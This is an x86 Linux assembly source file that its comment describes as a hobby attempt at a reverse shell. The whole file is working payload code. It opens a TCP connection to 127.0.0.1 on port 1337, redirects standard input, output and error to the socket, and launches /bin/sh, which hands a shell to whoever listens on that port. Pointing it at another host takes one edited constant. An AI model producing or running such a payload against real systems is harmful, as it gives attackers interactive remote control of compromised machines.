; rshell.asm
; just for fun, i'm trying to make a reverse shell on assembly language.

%define hton(x) ((x & 0xFF000000) >> 24) | ((x & 0x00FF0000) >>  8) | ((x & 0x0000FF00) <<  8) | ((x & 0x000000FF) << 24)
%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)

AF_INET         equ 0x2
SOCK_STREAM     equ 0x1
IPPROTO_TCP     equ 0x6

STDERR_FILENO   equ 2
STDOUT_FILENO   equ 1
STDIN_FILENO    equ 0

__NR_exit           equ 1
__NR_execve         equ 11
__NR_dup2           equ 63
__NR_socketcall     equ 102

SYS_SOCKET          equ 1
SYS_CONNECT         equ 3


PORT    equ     htons(1337)      ; 1337
HOST    equ     hton(2130706433) ; 127.0.0.1

struc sockaddr_in
    .sin_family resw 1
    .sin_port   resw 1
    .sin_addr   resd 1
    .sin_zero   resb 8
endstruc


section .data
    my_sa istruc sockaddr_in
        at sockaddr_in.sin_family, dw AF_INET
        at sockaddr_in.sin_port,   dw PORT
        at sockaddr_in.sin_addr,   dd HOST
        at sockaddr_in.sin_zero,   dd 0, 0
    iend

    socket_args:  dd AF_INET, SOCK_STREAM, IPPROTO_TCP
    connect_args: dd 0, my_sa, sockaddr_in_size
    shell_path:   dd "/bin/sh"

section .bss
    socket_fd resw 1

section .text
global _start


_start:

    ; socket(AF_INET, SOCK_STREAM, 0)
    mov ecx, socket_args    ; address of args structure
    mov ebx, SYS_SOCKET     ; subfunction or "command"
    mov eax, __NR_socketcall
    int 0x80

    cmp eax, -4096
    ja  exit

    mov [connect_args], eax
    mov edx, eax

    ; connect(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr))
    mov ecx, connect_args       ; address of args structure
    mov ebx, SYS_CONNECT        ; subfunction or "command"
    mov eax, __NR_socketcall    ; /usr/src/linux/net/socket.c
    int 0x80

    cmp eax, -4096
    ja  exit

    ; push fd which in edx to dup2
    mov ebx, edx

    ; dup2(fd, STDIN_FILENO);
    mov ecx, STDIN_FILENO
    mov eax, __NR_dup2
    int 0x80

    ; dup2(fd, STDOUT_FILENO);
    mov ecx, STDOUT_FILENO
    mov eax, __NR_dup2
    int 0x80

    ; dup2(fd, STDERR_FILENO);
    mov ecx, STDERR_FILENO
    mov eax, __NR_dup2
    int 0x80

    ; execve("/bin/sh", NULL, NULL);
    mov ebx, shell_path
    mov ecx, 0          ; null ptr to argv
    mov edx, 0          ; null ptr to envp

    mov eax, __NR_execve
    int 0x80

    jmp goodexit

goodexit:
    xor eax, eax        ; success

exit:
    mov ebx, eax        ; exitcode
    neg ebx
    mov eax, __NR_exit
    int 0x80
